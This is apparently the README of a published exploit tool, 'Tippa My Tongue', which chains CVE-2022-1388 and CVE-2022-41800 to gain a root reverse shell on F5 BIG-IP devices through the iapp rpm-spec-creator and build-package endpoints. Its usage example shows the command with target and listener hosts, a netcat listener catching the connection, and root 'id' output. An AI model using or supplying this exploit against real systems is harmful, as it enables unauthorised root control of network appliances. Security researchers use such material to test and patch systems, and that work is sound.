# Tippa My Tongue

Tippa My Tongue is an exploit that uses CVE-2022-1388 and CVE-2022-41800 to establish a `root` reverse shell on F5 BIG-IP products. Most CVE-2022-1388 exploits achieve code execution using `/mgmt/tm/util/bash`. However, this exploit uses `/mgmt/shared/iapp/rpm-spec-creator`, followed by `/mgmt/shared/iapp/build-package`. This approach was first suggested by [Ron Bowes](https://github.com/rbowes-r7) in this AttackerKB [analysis](https://attackerkb.com/topics/SN5WCzYO7W/cve-2022-1388/rapid7-analysis). Although, to my knowledge, no one ever published a CVE-2022-1388 exploit that did just that.

For more details, read the [VulnCheck](https://vulncheck.com/blog/new-cve-2022-1388) writeup.

## Usage Example:

```
albinolobster@mournland:~/tippa-my-tongue$ python3 tippa-my-tongue.py --rhost 10.9.49.191 --lhost 10.9.49.194

   ▄▄▄▄▄▪   ▄▄▄· ▄▄▄· ▄▄▄·     • ▌ ▄ ·.  ▄· ▄
   •██  ██ ▐█ ▄█▐█ ▄█▐█ ▀█     ·██ ▐███▪▐█▪██
    ▐█.▪▐█· ██▀· ██▀·▄█▀▀█     ▐█ ▌▐▌▐█·▐█▌▐█▪
    ▐█▌·▐█▌▐█▪·•▐█▪·•▐█ ▪▐▌    ██ ██▌▐█▌ ▐█▀·.
    ▀▀▀ ▀▀▀.▀   .▀    ▀  ▀     ▀▀  █▪▀▀▀  ▀ •
         ▄▄▄▄▄       ▐ ▄  ▄▄ • ▄• ▄▌▄▄▄ .
         •██  ▪     •█▌▐█▐█ ▀ ▪█▪██▌▀▄.▀·
          ▐█.▪ ▄█▀▄ ▐█▐▐▌▄█ ▀█▄█▌▐█▌▐▀▀▪▄
          ▐█▌·▐█▌.▐▌██▐█▌▐█▄▪▐█▐█▄█▌▐█▄▄▌
          ▀▀▀  ▀█▄▀▪▀▀ █▪·▀▀▀▀  ▀▀▀  ▀▀▀

                 CVE-2022-1388
                 CVE-2022-41800

                       🦞

[+] Executing netcat listener
[+] Using /usr/bin/nc
Listening on 0.0.0.0 1270
[+] Sending initial request to rpm-spec-creator
[+] Sending exploit attempt request to build-package
Connection received on 10.9.49.191 47152
bash: no job control in this shell
[@localhost:NO LICENSE:Standalone] BUILD # pwd
pwd
/var/config/rest/node/tmp/BUILD
[@localhost:NO LICENSE:Standalone] BUILD # id
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
[@localhost:NO LICENSE:Standalone] BUILD #
```

## Acknowledgements

* Ron Bowes: for discovering these endpoints and sharing them with the world
* [RHCP](https://www.youtube.com/watch?v=E1FNkf3MLKY): for being funky

